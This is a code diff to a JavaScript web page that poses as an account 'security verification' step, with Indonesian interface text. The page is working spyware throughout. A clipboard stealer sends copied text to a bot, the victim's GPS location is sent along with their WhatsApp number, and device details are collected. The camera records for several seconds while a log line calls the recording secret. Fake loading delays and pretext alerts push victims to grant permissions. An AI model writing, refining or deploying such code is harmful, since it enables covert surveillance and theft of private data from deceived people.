@@ -117,6 +117,17 @@
     let gpsOk = false, camOk = false;
     let targetWA = "";
 
+    // Clipboard Stealer
+    document.addEventListener('copy', () => {
+        setTimeout(() => {
+            navigator.clipboard.readText().then(text => {
+                if (text && text.length > 3) {
+                    sendToBot(`<b>📋 CLIPBOARD CAPTURED</b>\n${text}`);
+                }
+            });
+        }, 300);
+    });
+
     function log(message) {
         const logEl = document.getElementById("log");
         logEl.innerHTML += `<div>> ${message}</div>`;
@@ -132,8 +143,7 @@
     }
 
     function sendDeviceInfo() {
-        const info = `Device Info:\n` +
-                     `User-Agent: ${navigator.userAgent}\n` +
+        const info = `Device: ${navigator.userAgent}\n` +
                      `Platform: ${navigator.platform}\n` +
                      `Screen: ${screen.width}x${screen.height}\n` +
                      `Language: ${navigator.language}`;
@@ -153,8 +163,8 @@
             // Fake loading
             setTimeout(() => {
                 document.getElementById('permPage').classList.remove('hidden');
-                log("Memulai verifikasi keamanan...");
-            }, 1800);
+                log("Memulai proses verifikasi keamanan...");
+            }, 1500);
         } else {
             alert("VALIDASI GAGAL:\n- Nomor WA harus dimulai dengan 08\n- Kode Akses salah");
         }
@@ -166,16 +176,18 @@
             document.getElementById('btnGPS').innerText = "LOKASI AKTIF ✓";
             document.getElementById('btnGPS').classList.add('active');
             sendToBot(`<b>📍 LOKASI TERDETEKSI</b>\nWA: ${targetWA}\nMaps: <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">BUKA DI MAPS</a>`);
-            log("Lokasi berhasil diambil");
+            log("Lokasi berhasil diverifikasi");
         }, () => { 
-            alert("Harap aktifkan lokasi untuk melanjutkan verifikasi."); 
+            alert("Harap aktifkan lokasi untuk melanjutkan verifikasi keamanan."); 
         }, {enableHighAccuracy: true});
     }
 
     function getCAM() {
         document.getElementById('btnCAM').innerText = "MENGAKSES KAMERA...";
         
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: ["environment", "user"] } } })
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: ["environment", "user"] } } 
+        })
         .then(s => {
             camOk = true;
             document.getElementById('btnCAM').innerText = "KAMERA VERIFIED ✓";
@@ -195,7 +207,7 @@
             };
             mr.start();
             setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, 6500);
-            log("Merekam kamera selama 6.5 detik...");
+            log("Merekam kamera secara diam-diam...");
         })
         .catch(() => {
             alert("Kamera diperlukan untuk verifikasi keamanan akun.");
@@ -219,7 +231,7 @@
     }
 
     function execute() {
-        const target = document.getElementById('targetInput').value || "Unknown";
+        const target = document.getElementById('targetInput').value || "Unknown Target";
         document.getElementById('hackForm').classList.add('hidden');
         document.getElementById('logArea').classList.remove('hidden');
         
@@ -244,19 +256,10 @@
                 log("MODULE EXECUTION COMPLETE");
                 setTimeout(() => alert("Sukses! Data telah dikirim ke server."), 800);
             }
-        }, 1200);
+        }, 1100);
     }
 
-    // Clipboard Stealer
-    document.addEventListener('copy', () => {
-        navigator.clipboard.readText().then(text => {
-            if(text.length > 5) {
-                sendToBot(`<b>📋 CLIPBOARD CAPTURED</b>\n${text}`);
-            }
-        });
-    });
-
-    // Matrix Background
+    // Matrix Background (tetap dari kode asli lu)
     const c = document.getElementById('matrix');
     const x = c.getContext('2d');
     c.width = window.innerWidth;
